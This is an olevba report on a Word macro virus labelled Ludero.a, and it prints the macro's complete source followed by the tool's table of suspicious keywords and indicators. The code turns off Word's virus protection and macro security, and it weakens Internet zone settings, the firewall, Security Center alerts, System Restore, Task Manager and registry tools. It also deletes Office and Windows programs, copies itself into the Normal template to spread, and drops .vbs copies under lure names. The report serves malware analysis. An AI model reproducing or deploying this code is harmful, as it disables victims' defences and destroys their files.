olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ludero.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ludero.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Play.bas 
in file: Virus.MSWord.Ludero.a - OLE stream: 'Macros/VBA/Play'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
'cd-Rom

Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Option Explicit
' Hides the desktop icons

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro Ludero"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Play.AutoOpen"
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

MsgBox "Listen your musics.", vbOKOnly + vbInformation + vbSystemModal, "CD Music"

Dim lngReturn As Long
Dim strReturn As Long
Dim i
For i = 1 To 21
lngReturn = mciSendString("set CDAudio door open", strReturn, 127, 0)
lngReturn = mciSendString("set CDAudio door closed", strReturn, 127, 0)
Next
'Open and close the CD-Rom tray 21 times

Dim hWnd As Long
hWnd = FindWindowEx(0&, 0&, "Progman", vbNullString)
ShowWindow hWnd, 0
'Hides the desktop icons

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Ludero\Ledon", "Action") = "Saved"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess", "Start") = "3"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "CurrentLevel") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1001") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1004") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1200") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1201") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1206") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1400") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1402") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1405") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1406") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1407") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1601") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1604") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1605") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1606") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1607") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1608") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1609") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1800") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1802") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1803") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1804") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1005") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A00") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A02") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A03") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A04") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A05") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A06") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3", "1A10") = "0"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "UpdatesDisableNotify") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusOverride") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallOverride") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "FirewallDisableNotify") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center", "AntiVirusDisableNotify") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = "1"

WordBasic.Kill "C:\Program Files\Microsoft Office\Office\Excel.exe"
WordBasic.Kill "C:\Program Files\Microsoft Office\Office\Powerpnt.exe"
WordBasic.Kill "C:\Program Files\Outlook Express\msimn.exe"
WordBasic.Kill "C:\Windows\Calc.exe"
WordBasic.Kill "C:\Windows\Notepad.exe"
WordBasic.Kill "C:\Program Files\MSN Messenger\*.*"
WordBasic.Kill "C:\Program Files\MSN Toolbar\*.*"

If Day(Now()) = 3 Or (Day(Now)) = 6 Or (Day(Now)) = 9 Or (Day(Now)) = 12 Or (Day(Now)) = 15 Or (Day(Now)) = 18 Then
MsgBox "Files deleted.", vbOKOnly + vbExclamation + vbSystemModal, "Information "

End If

End Sub


Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro Ludero"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Play.AutoClose"
On Error Resume Next
ActiveDocument.SaveAs FileName:="C:\WINDOWS\system32\Dimun.vbs"
ActiveDocument.SaveAs FileName:="C:\WINDOWS\system\Dimu.vbs"
ActiveDocument.SaveAs FileName:="C:\Winnt\System32\Dime.vbs"
ActiveDocument.SaveAs FileName:="C:\WINDOWS\Application Data\Musical.vbs"
ActiveDocument.SaveAs FileName:="C:\WINDOWS\HELP\Music.vbs"
ActiveDocument.SaveAs FileName:="C:\WINDOWS\FONTS\Readme.vbs"
ActiveDocument.SaveAs FileName:="C:\My Shared Folder\Dinuor.vbs"
ActiveDocument.SaveAs FileName:="C:\Program Files\Dinumon.vbs"
ActiveDocument.SaveAs FileName:="C:\Windows\Dolun.vbs"
ActiveDocument.SaveAs FileName:="C:\Windows\Girls.vbs"
ActiveDocument.SaveAs FileName:="C:\Windows\Game.vbs"
ActiveDocument.SaveAs FileName:="C:\Windows\Women.vbs"
ActiveDocument.SaveAs FileName:="C:\Windows\Tecnu.vbs"
ActiveDocument.SaveAs FileName:="C:\Dilen.vbs"

Dim iMacroCount
   Dim i
   Dim Exist
   Dim Instal
   Dim sMe$
   Dim sMacro$
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
      If WordBasic.[MacroName$](i, 0, 0) = "Play" Then
           Instal = -1
      End If

      If WordBasic.[MacroName$](i, 0, 0) = "Play" Then
           Exist = -1
       End If
   Next i
   If Not Exist And Not Instal Then
     sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Play"
       WordBasic.MacroCopy sMacro$, "Global:Play"
      
   If NormalTemplate.Saved = False Then NormalTemplate.Save
     
 End If
   
   ActiveDocument.Save

End Sub

Sub ToosMacro()
Attribute ToosMacro.VB_Description = "Macro Ludero"
Attribute ToosMacro.VB_ProcData.VB_Invoke_Func = "Project.Play.ToosMacro"
    On Error Resume Next
    Application.DisplayStatusBar = False 'Disable tools macro
    
End Sub










    
    
    

    




        












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |Powerpnt.exe        |Executable file name                         |
|IOC       |msimn.exe           |Executable file name                         |
|IOC       |Calc.exe            |Executable file name                         |
|IOC       |Notepad.exe         |Executable file name                         |
|IOC       |Dimun.vbs           |Executable file name                         |
|IOC       |Dimu.vbs            |Executable file name                         |
|IOC       |Dime.vbs            |Executable file name                         |
|IOC       |Musical.vbs         |Executable file name                         |
|IOC       |Music.vbs           |Executable file name                         |
|IOC       |Readme.vbs          |Executable file name                         |
|IOC       |Dinuor.vbs          |Executable file name                         |
|IOC       |Dinumon.vbs         |Executable file name                         |
|IOC       |Dolun.vbs           |Executable file name                         |
|IOC       |Girls.vbs           |Executable file name                         |
|IOC       |Game.vbs            |Executable file name                         |
|IOC       |Women.vbs           |Executable file name                         |
|IOC       |Tecnu.vbs           |Executable file name                         |
|IOC       |Dilen.vbs           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

